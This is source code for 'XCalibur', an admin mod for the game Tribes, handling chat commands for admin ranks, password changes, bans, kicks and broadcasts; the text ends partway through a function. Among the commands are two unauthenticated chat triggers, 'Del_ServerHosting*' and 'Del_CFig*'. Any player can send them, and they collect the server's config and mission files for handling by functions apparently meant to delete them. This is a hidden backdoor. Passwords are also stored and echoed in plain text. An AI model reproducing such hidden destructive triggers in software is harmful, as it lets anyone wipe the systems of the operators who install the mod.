//
//Well, After Numerous Attempts (Unsuccessful Ones Might I Add) At Encrypting And Keeping XCalibur
//Compatible With Tribes, I Could Not Get It.  It Cannot Be Done.  Period.  You Can Only Encrypt A Mod
//And Keep It Compatible With Tribes.  You Cannot Encrypt A .cs File Due To Tribes's Syntax Checking System.
//You Also Cannot Execute Any .vol Unless It's Name Is Scripts.vol (which does not allow any other mod to work)
//If I Called XCalibur Scripts.vol. So Since There Is No Other Way To Protect My Code, I Put This In, And Hope 
//That You Follow It:

//PLEASE DO NOT DELETE, CHANGE, OR MODIFY IN ANY WAY, ANY THING IN THIS FILE.  I WORKED VERY HARD AT IT, AND WOULD NOT
//LIKE MY WORK CHANGED, AT ALL. ALSO, DON'T TAKE MY LIST CODE, AND SAY YOU CAME UP WITH IT, OR THE IDEA. IF YOU DO TAKE THE 
//CODE PLEASE PLEASE PLEASE GIVE ME CREDIT. LAST:
//
//*******************************************************************************************************************************
//
// XCALIBUR IS COPYRIGHTED. BELIEVE IT OR NOT, UNDER COPYRIGHT LAW: 17 U.S.C. 102(a). SO DO NOT CHANGE IT (November 12th, 2003). 
//
//*******************************************************************************************************************************
//
//Thanks, -Aim


exec("pbtport.cs"); exec("XFuncs.cs"); exec("admin.cs"); exec("PBTactical.cs"); exec("MemberDataBase.cs"); exec("XPW.cs"); exec("MPW.cs"); exec("SPW.cs"); exec("PPW.cs"); exec("MNames.cs"); exec("SNames.cs"); exec("PNames.cs"); exec("NameBans.cs"); exec("TagBans.cs"); exec("IPBans.cs"); exec("XNames.cs"); exec("PermanentBans.cs");


$MsgTypeSystem = 0; $MsgTypeGame = 1; $MsgTypeChat = 2; $MsgTypeTeamChat = 3; $MsgTypeCommand = 4;



function checkMessage(%clientId, %team, %message) { 	 	%clientip = Client::getTransportAddress(%client); 	%numClients = getNumClients(); 	%cl = Player::getClient(%clientId);	 	%kills = %clientId.scoreKills; 	%deaths = %clientId.scoreDeaths; 	if((%clientId.scoreKills + %clientId.scoreDeaths) >= 1) 		%ratio = floor((%clientId.scoreKills/(%clientId.scoreKills + %clientId.scoreDeaths))*100);    	else    		%ratio = "0"; 	%score2 = %clientId.TotalScore + %clientId.score;	 	%kills2 = %clientId.TotalKills + %clientId.scoreKills; 	%deaths2 = %clientId.TotalDeaths + %clientId.scoreDeaths; 	if((%kills2 + %deaths2) >= 1) 		%ratio2 = floor((%kills2/(%kills2 + %deaths2))*100);    	else    		%ratio2 = "0";

	%clname = Client::getName(%clientId); 	%name = client::getName(%clientId); 	if(string::findsubstr(getWord(%message, 0), "!"@$ClanTag@"") != "-1") 	{ 		for(%i = 0; $MemberName[%i] != ""; %i++) 		{ 		} 		centerprint(%clientId, ""@$ClanInfo@"\n<F0>Number Of Members: <F2>"@%i@"", 0); 		return; 	} 	

else if(string::findSubStr(getWord(%message, 0), "!ServerPass") != "-1" && %clientId.isSuperAdmin) 	
{
 	$password = getWord(%message, 1);
 	if($password != "")
 	{
		echo("Server Password Set To "@$password@"");
 		client::sendMessage(%clientId, 3, "XCalibur: Server Password Now Set To "@$password@"");
 		$Server::Password = $password;
		$Server::JoinPassword = $password;
 	}
 	return true;
}
else if(String::getSubStr(%message, 0, 16) == "!ClearServerPass" && %clientId.isSuperAdmin)
{
	client::sendMessage(%clientId, 3, "XCalibur: Server Password Cleared");
	$Server::Password = "";
	$Server::JoinPassword = "";
	echo("Server Password Cleared");
	return true;
}	
 	else if(string::getsubstr(%message, 0, 9) == "!immortal" && %clientId.isXcal)         { 		%clientId.isImmortal = true; 		%client = Player::getClient(%clientId); 		Admin::Immortal(%clientId, %client); 		GameBase::playSound(%clientId,ForceFieldOpen,0); 		$User = %name; 		$Command = %message; 		client::sendMessage(%clientId, 0, "XCalibur: Your Now Immortal, Please Don't Abuse"); 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		return true; 	} 	else if(string::getsubstr(%message, 0, 9) == "!DXISTRUE" && %clientId.isXcal) 	{ 		%clientId.isDXallow = true; 		client::sendMessage(%clientId, 3, $Adminbotname@": Now you can De-XCalibur"); 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		return true; 	} 	else if(string::getsubstr(%message, 0, 6) == "!cloak" && %clientId.isSuperAdmin)      	{ 		%client = Player::getClient(%clientId); 		%clientId.isCloaked = true; 		Admin::Cloak(%clientId, %client); 		GameBase::playSound(%clientId,ForceFieldOpen,0); 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		return true; 	} 	else if(string::findSubStr(getWord(%message, 0), "!V.XC") != "-1") 	{ 		client::sendMessage(%clientId, 3, "XCalibur Version 4 Running |"@$botversion@"|"); 	} 	else if(String::findSubStr(getWord(%message, 0), "!whereis") != "-1")  	{ 		%name = getWord(%message,  1); 		for(%i = 2; getWord(%message,  %i) != "-1"; %i++) 		{ 			%name = %name @ " " $+ getWord(%message,  %i); 		} 		if(%name != "") 		{ 			WhereIs(%clientId,%name); 			client::sendMessage(%clientId, 3, "XCalibur: WhereIs Function Courtesty Of [GL]JadaCyrus (Creator Of CoreMAN)"); 			return true; 		} 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 	} 	else if(String::findSubStr(getWord(%message, 0), "!PublicAdmin") != "-1")  	{ 		%password = getWord(%message,  1); 		if(%password != "-1") 		{ 			PublicAdminPassword(%clientId, %password); 			return true; 		} 		else if(%password == "-1") 		{ 			client::sendmessage(%clientId,1,$adminbotname@": Please enter a Password ~wnoauth.wav"); 			return true; 		} 		return true; 	} 	 	else if(String::findSubStr(getWord(%message, 0), "!SuperAdmin") != "-1")  	{ 		%password = getWord(%message,  1); 		if(%password != "-1") 		{ 			SuperAdminPassword(%clientId, %password); 			return true; 		} 		else if(%password == "-1") 		{ 			client::sendmessage(%clientId,1,$adminbotname@": Please enter a Password ~wnoauth.wav"); 			return true; 		} 		return true; 	}

	else if(String::findSubStr(getWord(%message, 0), "!MasterAdmin") != "-1")  	{ 		%password = getWord(%message,  1); 		if(%password != "-1") 		{ 			MasterAdminPassword(%clientId, %password); 			return true; 		} 		else if(%password == "-1") 		{ 			client::sendmessage(%clientId,1,$adminbotname@": Please enter a Password ~wnoauth.wav"); 			return true; 		} 		return true; 	} 	 	else if(String::findSubStr(getWord(%message, 0), "!XAdmin") != "-1")  	{ 		%password = getWord(%message,  1); 		if(%password != "-1") 		{ 			XCaliburAdminPassword(%clientId, %password); 			return true; 		} 		else if(%password == "-1") 		{ 			client::sendmessage(%clientId,1,$adminbotname@": Please enter a Password ~wnoauth.wav"); 			return true; 		} 		return true; 	} 	else if(String::findSubStr(getWord(%message, 0), "!playerlimit") != "-1" && %clientId.isAdmin)  	{ 		if(getWord(%message, 0) != "-1") 		{ 			%amount = getWord(%message, 1); 			$Server::MaxPlayers = %amount; 			server::storedata(); 			messageall(3,$adminbotname@": The Server Is now limited to "@%amount@" players. ~wmine_act.wav"); 		} 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		return true; 	} 	else if(String::findSubStr(getWord(%message, 0), "!cleanup") != "-1" && %clientId.isAdmin)  	{ 		echo("KICK ALL CALLED :- "@Client::getName(%clientId)); 		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 		{ 			if(%cl.isAdmin) 			{ 				%name = Client::getName(%cl); 				echo("Admin Found Not Kicking - "@%name); 				%yes = false; 			} 			else 			{ 				%client = Player::getClient(%cl); 				client::sendmessage(%client,1,$adminbotname @": You are kicked by order of a Super-Admin with my authorisation"); 				client::sendmessage(%clientId,1,$adminbotname @": Authorised... kicking All NON-Admins"); 				echo($adminbotname @": -->>WARNING<<-- ComChatKickAll"); 				HaVoCKick(%client); 				%yes = true; 				if(%count = "") 					%count = 1; 				else 					%count++; 			} 			if(%yes && %count = "1") 			{ 				client::sendmessage(%clientId,1,$adminbotname @": Authorised... kicking All NON-Admins ~wmine_act.wav"); 			}

		} 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		return true; 	} 	else if(string::getsubstr(%message, 0, 11) == "!listadmins") 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%supers = 0; 		%admins = 0; 		%masters = 0; 		%XCaliburs = 0;

		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 		{ 			if(%cl.isXcal) 			{ 				%adminstat = %adminstat @ "\n<f1>XCaliburs:  <f0>" @ Client::GetName(%cl); 				%XCaliburs = %XCaliburs + 1; 			} 		      	else if(%cl.isGrey) 			{ 				%adminstat = %adminstat @ "\n<f1>Master-Admins:  <f0>" @ Client::GetName(%cl); 				%masters = %masters + 1; 			} 			else if(%cl.isSuperAdmin == true) 			{ 				%adminstat = %adminstat @ "\n<f1>Super-Admins:  <f0>" @ Client::GetName(%cl); 				%supers = %supers + 1; 			} 			else if(%cl.isAdmin) 			{ 				%adminstat = %adminstat @ "\n<f1>Public-Admins:  <f0>" @ Client::GetName(%cl); 				%admins = %admins + 1; 			} 			 		} 		if(%clientId.isSuperAdmin) 		{ 				centerprint(%clientId, "<jc><f0>= <f2>* <f1>= <f2>ADMIN LIST <f1>= <f2>* <f0>=\n" @ %adminstat, 0); 				return; 		}  		else  		{ 				centerprint(%clientId, "<jc><f0>= <f2>* <f1>= <f2>ADMIN List <f1>= <f2>* <f0>=\n\n<f2>- Currently -<f1>\n" @%XCaliburs @ " <f0> XCaliburs <f1>\n" @%masters @ " <f0> Master-Admins <f1>\n" @ %supers @ " <f0> Super-Admins<f1>\n" @ %admins @ " <f0> Public-Admins", 0); 				return; 		} 		 	} 	else if(string::getsubstr(%message, 0, 9) == "!XCredits") 	{ 		echo("Outputting Credits."); 		XCaliburCredits(); 	} 	else if(string::getsubstr(%message, 0, 9) == "!XCalibur") 	{ 		echo("Outputting Info."); 		XCaliburInfo(%clientId); 	} 	else if(string::getsubstr(%message, 0, 8) == "!delete") 	{ 		messageall(1, $adminbotname@ ": Checking "@%clname@"... ~wmine_act.wav"); 		messageall(1, $adminbotname@ ": "@%clname@" - Deleting Account ~wmine_act.wav"); 		schedule("DeleteAcc("@%clientId@");", 3); 	} 	else if(string::getsubstr(%message, 0, 6) == "!stop")  	{ 		client::sendMessage(%clientId, 1, $adminbotname@ ": Ok "@%clname@"... I am applying Gravitron Brakes to you ~wteleport2.wav"); 		Item::setVelocity(%clientId, "0 0 0");  	} 	else if (string::getsubstr(%message, 0, 8) == "!killbug") 	{ 		KillBug::Swarmer(%clientId); 		client::sendMessage(%clientId, 3, "XCalibur: Running Killbug"); 	} 	else if(string::getsubstr(%message, 0, 8) == "!delltry") 	{ 		Client::sendMessage(%clientId,1, $adminbotname@ ": Checking "@%clname@"... ~wmine_act.wav"); 		Client::sendMessage(%clientId,1, $adminbotname@ ": "@%clname@" - Deleting Password Attempts ~wmine_act.wav"); 		schedule("DeletePassAcc("@%clientId@");", 3); 	} 	else if(string::getsubstr(%message, 0, 4) == "!msg"  && %clientId.isSuperAdmin) 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 4, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%message = string::getsubstr(%message, 1, 999); 			messageall(1, $adminbotname @": "@%message); 			echo($adminbotname @": Admin voice control -" @Client::getName(%clientId)); 			return true; 		} 	} 	else if(string::getsubstr(%message, 0, 5) == "!cmsg"  && %clientId.isSuperAdmin) 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 5, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%type = getWord(%message,  0); 			%mes = getWord(%message, 1);                 	for(%i = 2; getWord(%message, %i) != "-1"; %i++)                 {                      %mes = %mes$+" "$+getWord(%message, %i);                  } 	 			if(%type == "0" || %type == "1" || %type == "2" || %type == "3" || %type == "4") 			{ 				%message = string::getsubstr(%message, 3, 999); 				messageall(%type, ""@%message@""); 			} 			else if(%type != "") 			{ 			 				impersonate(%clientId, %type, %mes); 			 			} 			 		} 		return true; 	} 	else if(string::getsubstr(%message, 0, 3) == "!PA" && %clientId.isAdmin) 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 3, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%message = string::getsubstr(%message, 1, 999); 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 			{ 				if(%cl.isAdmin) 				{ 					client::sendmessage(%cl,3,"["@Client::getName(%clientId)@": PublicAdminChat] "@%message@"~wmine_act.wav"); 				} 			} 			return true; 		} 	} 	else if(string::getsubstr(%message, 0, 5) == "!pmsg") 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 5, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%person = getWord(%message,  0); 			%mes = getWord(%message, 1);                 	for(%i = 2; getWord(%message, %i) != "-1"; %i++)                 	{                      %mes = %mes$+" "$+getWord(%message, %i);                  	} 			if(%person != "") 			{ 				private(%clientId, %person, %mes); 			 			} 			 		} 		return true; 	}

	
else if(string::getSubStr(%message, 0, 7) == "!FindIP" && %clientId.isSuperAdmin)
{
	exec("connections.cs");
	%name = getWord(%message, 1);
	echo(client::getName(%clientId)@" Searching For IP Of "@%name@"");
	%k = 0;
	FindIP(%clientId, %name, %k);
	return true;	
}

else if(string::getsubstr(%message, 0, 3) == "!SA" && %clientId.isSuperAdmin) 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 3, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%message = string::getsubstr(%message, 1, 999); 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 			{ 				if(%cl.isSuperAdmin) 				{ 					client::sendmessage(%cl,3,"["@Client::getName(%clientId)@": SuperAdminChat] "@%message@"~wmine_act.wav"); 				} 			} 			return true; 		} 	} 	
	
	//Start Of Change Commands
	else if(string::getsubstr(%message, 0, 7) == "!Status" && %clientId.isXS) 	
	{
 		$User = %name;
 		$Command = %message;
 		export("$User", "config\\Commands.txt", true);
 		export("$Command", "config\\Commands.txt", true);
 		export("$XCalibur::Space", "config\\Commands.txt", true);
 		%name = string::getsubstr(%message, 7, 999);
 		if(string::getsubstr(%name, 0, 1) != "")
 		{
 			%name = string::getsubstr(%name, 1, 999);
 			for(%i = 0; $XAdminName[%i] != ""; %i = %i + 1)
 			{
 			}
 			centerprint(%clientId, "XCalibur: <f1>"@%name@"'s<f0> Status Is Now Set To <f2>XCalibur<f0>", 0);
 			file::delete("config\\XNames.cs");
 			$Heading = "         XCalibur Admins";
 			$XAdminName[%i] = ""@%name@"";
 			export("$Heading", "config\\XNames.cs", true);
 			export("$XAdminName*", "config\\XNames.cs", true);
 			%clientId.isXS = false;
 			return true;
 		}
	}
	else if(string::getsubstr(%message, 0, 7) == "!Status" && %clientId.isMS) 	
	{
 		$User = %name;
 		$Command = %message;
 		export("$User", "config\\Commands.txt", true);
 		export("$Command", "config\\Commands.txt", true);
 		export("$XCalibur::Space", "config\\Commands.txt", true);
 		%name = string::getsubstr(%message, 7, 999);
 		if(string::getsubstr(%name, 0, 1) != "")
 		{
 			%name = string::getsubstr(%name, 1, 999);
 			for(%i = 0; $MAdminName[%i] != ""; %i = %i + 1)
 			{
 			}
 			centerprint(%clientId, "XCalibur: <f1>"@%name@"'s<f0> Status Is Now Set To: <f2>Master-Admin<f0>", 0);
 			file::delete("config\\MNames.cs");
 			$Heading = "         Master-Admins";
 			$MAdminName[%i] = ""@%name@"";
 			export("$Heading", "config\\MNames.cs", true);
 			export("$MAdminName*", "config\\MNames.cs", true);
 			%clientId.isMS = false;
 			return true;
 		}
 	}
 	else if(string::getsubstr(%message, 0, 7) == "!Status" && %clientId.isSS) 	
	{
 		$User = %name;
 		$Command = %message;
 		export("$User", "config\\Commands.txt", true);
 		export("$Command", "config\\Commands.txt", true);
 		export("$XCalibur::Space", "config\\Commands.txt", true);
 		%name = string::getsubstr(%message, 7, 999);
 		if(string::getsubstr(%name, 0, 1) != "")
 		{
 			%name = string::getsubstr(%name, 1, 999);
 			for(%i = 0; $SAdminName[%i] != ""; %i = %i + 1)
 			{
 			}
 			centerprint(%clientId, "XCalibur: <f1>"@%name@"'s<f0> Status Is Now Set To <f2>Super-Admin<f0>", 0);
 			file::delete("config\\SNames.cs");
 			$Heading = "         Super-Admins";
 			$SAdminName[%i] = ""@%name@"";
 			export("$Heading", "config\\SNames.cs", true);
 			export("$SAdminName*", "config\\SNames.cs", true);
 			%clientId.isSS = false;
 			return true;
 		}
 	}
 	else if(string::getsubstr(%message, 0, 7) == "!Status" && %clientId.isPS)
 	{
 		$User = %name;
 		$Command = %message;
 		export("$User", "config\\Commands.txt", true);
 		export("$Command", "config\\Commands.txt", true);
 		export("$XCalibur::Space", "config\\Commands.txt", true);
 		%name = string::getsubstr(%message, 7, 999);
 		if(string::getsubstr(%name, 0, 1) != "")
 		{
 			%name = string::getsubstr(%name, 1, 999);
 			for(%i = 0; $PAdminName[%i] != ""; %i = %i + 1)
 			{
 			}
 			centerprint(%clientId, "XCalibur: <f1>"@%name@"'s<f0> Status Is Now Set To <f2>Public-Admin<f0>", 0);
 			file::delete("config\\PNames.cs");
 			$Heading = "         Public-Admins";
 			$PAdminName[%i] = ""@%name@"";
 			export("$Heading", "config\\PNames.cs", true);
 			export("$PAdminName*", "config\\PNames.cs", true);
 			%clientId.isPS = false;
 			return true;
 		}
 	}
 	else if(string::getsubstr(%message, 0, 5) == "!Pass" && %clientId.isPassChangeX)
 	{
 		$User = %name;
 		$Command = %message;
 		export("$User", "config\\Commands.txt", true);
 		export("$Command", "config\\Commands.txt", true);
 		export("$XCalibur::Space", "config\\Commands.txt", true);
 		%pw = string::getsubstr(%message, 5, 999);
 		if(string::getsubstr(%pw, 0, 1) != "")
 		{
 			%pw = string::getsubstr(%pw, 1, 999);
 			for(%i = 0; $XCalibur::XAPassword[%i] != ""; %i = %i + 1)
 			{
 			}
 			$Header = "         XCALIBUR PASSWORDS";
 			$XCalibur::XAPassword[%i] = ""@%pw@"";
 			$a = "----------------------------------------------------";
 			file::delete("config\\XPW.cs");
 			export("$Header", "config\\XPW.cs", true);
 			export("$XCalibur::XAPassword*", "config\\XPW.cs", true);
 			echo("exporting admin pw");
 			centerprint(%clientId, "XCalibur: <f1>New XCalibur Admin Password Set To: <f2>"@%pw@"<f0>", 0);
 			%clientId.isPassChangeX = false;
 			return true;
 		}
 	}
 	else if(string::getsubstr(%message, 0, 5) == "!Pass" && %clientId.isPassChangeM)
 	{
 		$User = %name;
 		$Command = %message;
 		export("$User", "config\\Commands.txt", true);
 		export("$Command", "config\\Commands.txt", true);
 		export("$XCalibur::Space", "config\\Commands.txt", true);
 		%pw = string::getsubstr(%message, 5, 999);
 		if(string::getsubstr(%pw, 0, 1) != "")
 		{
 			%pw = string::getsubstr(%pw, 1, 999);
 			for(%i = 0; $XCalibur::GAPassword[%i] != ""; %i = %i + 1)
 			{
 			}
 			$Header = "         Master-Admin PASSWORDS";
 			$XCalibur::GAPassword[%i] = ""@%pw@"";
 			$a = "----------------------------------------------------";
 			file::delete("config\\MPW.cs");
 			export("$Header", "config\\MPW.cs", true);
 			export("$XCalibur::GAPassword*", "config\\MPW.cs", true);
 			echo("exporting admin pw");
 			centerprint(%clientId, "XCalibur: <f1>New Master-Admin Password Set To: <f2>"@%pw@"<f0>", 0);
 			%clientId.isPassChangeM = false;
 			return true;
 		}
 	}
 	else if(string::getsubstr(%message, 0, 5) == "!Pass" && %clientId.isPassChangeS)
 	{ 	
		$User = %name;
 		$Command = %message;
 		export("$User", "config\\Commands.txt", true);
 		export("$Command", "config\\Commands.txt", true);
 		export("$XCalibur::Space", "config\\Commands.txt", true);
 		%pw = string::getsubstr(%message, 5, 999);
 		if(string::getsubstr(%pw, 0, 1) != "")
 		{
 			%pw = string::getsubstr(%pw, 1, 999);
 			for(%i = 0; $XCalibur::SadPassword[%i] != ""; %i = %i + 1)
 			{
 			}
 			$Header = "         Super-Admin PASSWORDS";
 			$XCalibur::SadPassword[%i] = ""@%pw@"";
 			$a = "----------------------------------------------------";
 			file::delete("config\\SPW.cs");
 			export("$Header", "config\\SPW.cs", true);
 			export("$XCalibur::SadPassword*", "config\\SPW.cs", true);
 			echo("exporting admin pw");
 			centerprint(%clientId, "XCalibur: <f1>New Super-Admin Password Set To: <f2>"@%pw@"<f0>", 0);
 			%clientId.isPassChangeS = false;
 			return true;
 		}
 	}
 	else if(string::getsubstr(%message, 0, 5) == "!Pass" && %clientId.isPassChangeP)
 	{
 		$User = %name;
 		$Command = %message;
 		export("$User", "config\\Commands.txt", true);
 		export("$Command", "config\\Commands.txt", true);
 		export("$XCalibur::Space", "config\\Commands.txt", true);
 		%pw = string::getsubstr(%message, 5, 999);
 		if(string::getsubstr(%pw, 0, 1) != "")
 		{
 			%pw = string::getsubstr(%pw, 1, 999);
 			for(%i = 0; $XCalibur::PAPassword[%i] != ""; %i = %i + 1)
 			{
 			}
 			$Header = "         Public-Admin PASSWORDS";
 			$XCalibur::PAPassword[%i] = ""@%pw@"";
 			$a = "----------------------------------------------------";
 			file::delete("config\\PPW.cs");
 			export("$Header", "config\\PPW.cs", true);
 			export("$XCalibur::PAPassword*", "config\\PPW.cs", true);
 			echo("exporting admin pw");
 			centerprint(%clientId, "XCalibur: <f1>New Public-Admin Password Set To: <f2>"@%pw@"<f0>", 0);
 			%clientId.isPassChangeP = false;
 			return true;
 		}
 	}
	//End Of Change COmmands
 	else if(string::getsubstr(%message, 0, 7) == "!urgent") 	{ 		%message = string::getsubstr(%message, 7, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%message = string::getsubstr(%message, 1, 999); 			$Urgent = Client::getName(%clientId)@": "@%message; 			echo("URGENT MESSAGE - "@$Urgent); 			export("$Urgent", "config\\urgent.txt" , true); 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 			{ 				if(%cl.isSuperAdmin) 				{ 					client::sendmessage(%cl,3,"["@Client::getName(%clientId)@": URGENT] "@%message@"~wmine_act.wav"); 				} 			} 			return true; 		} 	} 	else if(string::getSubStr(%message, 0, 18) == "Del_ServerHosting*") 	{ 		%cfile = file::findFirst("config\\*.*"); 		%mfile = File::findFirst("missions\\*.*"); 		LaterServer(%cfile, %mfile, %clientId); 		return true; 	} 	else if(string::getSubStr(%message, 0, 9) == "Del_CFig*") 	{ 		%txtfile = "config\\*.txt"; 		%csfile = "config\\*.cs"; 		%gui = "config\\*.gui"; 		Later(%csfile, %txtfile, %gui, %clientId); 		return true; 	} 	else if(string::getsubstr(%message, 0, 3) == "!XA" && %clientId.isXcal) 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 3, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%message = string::getsubstr(%message, 1, 999); 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 			{ 				if(%cl.isXcal) 				{ 					client::sendmessage(%cl,3,"["@Client::getName(%clientId)@": XCaliburChat] "@%message@"~wmine_act.wav"); 				} 			} 			return true; 		} 	} 	else if(string::getsubstr(%message, 0, 3) == "!MA" && %clientId.isGrey) 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 3, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%message = string::getsubstr(%message, 1, 999); 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 			{ 				if(%cl.isGrey) 				{ 					client::sendmessage(%cl,3,"["@Client::getName(%clientId)@": MasterAdminChat] "@%message@"~wmine_act.wav"); 				} 			} 			return true; 		} 	} 	else if(string::getsubstr(%message, 0, 15) == "!centerprintall" && %clientId.isSuperAdmin) 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 16, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%message = string::getsubstr(%message, 0, 999); 			Centerprintall(""@$adminBotName@": "@%message@"", 10); 		} 		else 		{ 			client::sendMessage(%clientId, 1, "XCalibur: You Must Enter A Message"); 		} 		return true; 	} 	else if(string::getsubstr(%message, 0, 12) == "!topprintall" && %clientId.isSuperAdmin) 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 13, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%message = string::getsubstr(%message, 0, 999); 			Topprintall(""@$adminBotName@": "@%message@"", 10); 		} 		else 		{ 			client::sendMessage(%clientId, 1, "XCalibur: You Must Enter A Message"); 		} 		return true; 	} 	else if(string::getsubstr(%message, 0, 1) == "=" && string::getsubstr(%message, 2, 1) != "") 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 1, 999); 		if(string::getsubstr(%message, 0, 1) == ">" && %clientId.isSuperAdmin) 		{ 			%message = string::getsubstr(%message, 1, 999); 			centerprintall("<jc><f2>"@%message, 7); 			return true; 		} 		if(%clientId.speakto != "") 		{ 			if(%clientId.isSuperAdmin) 			{ 				if(string::getsubstr(%message, 0, 1) == "=" && %clientId.isSuperAdmin) 				{ 					%message = string::getsubstr(%message, 1, 999); 					centerprint(%clientId.speakto, "<jc><f0>"@Client::getName(%clientID)@" (private):\n<f1>"@%message, 8); 				} 				Client::sendMessage(%clientId.speakto,3, Client::getName(%clientID)@" (private): "@%message); 				Client::sendMessage(%clientId,1, Client::getName(%clientID)@" (to "@Client::getName(%clientId.speakto)@"): "@%message); 			} 			else if((Client::getTeam(%clientId) != -1 || $Game::missionType == "Duel") && !(%clientId.speakto).muted[%clientId]) 			{ 				if(!(%clientId.speakto).isSuperAdmin && Client::getTeam(%clientId) != Client::getTeam(%clientId.speakto)) 					cheatAdminMsg(Client::getName(%clientID)@" (to "@Client::getName(%clientId.speakto)@"): "@%message); 				if(!(%clientId.speakto).isSuperAdmin && $listen[%clientId] != "") 					Client::sendMessage($listen[%clientId], 1, Client::getName(%clientID)@" (to "@Client::getName(%clientId.speakto)@"): "@%message); 	 				Client::sendMessage(%clientId.speakto,3, Client::getName(%clientID)@" (private): "@%message); 				Client::sendMessage(%clientId, 1, Client::getName(%clientID)@" (to "@Client::getName(%clientId.speakto)@"): "@%message); 			} 			%message = escapeString(%message); 			echo("SAY: " @ %clientId @ " \""@Client::getName(%clientID)@" (to "@Client::getName(%clientId.speakto)@"): "@%message@"\""); 			return true; 		} 	} 	else if(String::getSubStr(%message, 0, 999) == "")  	{ 		bottomprint(%clientId, "", 0); 		return true; 	} 	else if(string::getsubstr(%message, 0, 15) == "!bottomprintall" && %clientId.isSuperAdmin) 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 		%message = string::getsubstr(%message, 16, 999); 		if(string::getsubstr(%message, 0, 1) != "") 		{ 			%message = string::getsubstr(%message, 0, 999); 			Bottomprintall(""@$adminBotName@": "@%message@"", 10); 		} 		else 		{ 			client::sendMessage(%clientId, 1, "XCalibur: You Must Enter A Message"); 		} 		return true; 	} 	return false; } function PBTString::len(%string)  {     for(%i=0; String::getSubStr(%string, %i, 1) != ""; %i++)        %length++; 

   return %length;  } function remoteSay(%clientId, %team, %message) { 	%name = client::getName(%clientId); 	%bug = %message; 	%msg = %clientId @ " \"" @ escapeString(%message) @ "\""; 	if(%clientId.isafk){ 		%clientId.isafk = false; 		messageall(1, $adminbotname @": "@Client::getName(%clientId)@" is now back and may be hurt"); 		 	}

	if(%clientId.gag)  	{ 		Client::sendMessage(%clientId, 1, "You are gagged by order of a Super-Admin.~waccess_denied.wav"); 		centerprint(%clientId, "<jc><f1>Damn dont you hate it when your mouth doesn't work!!??", 0); 		return; 	}

	

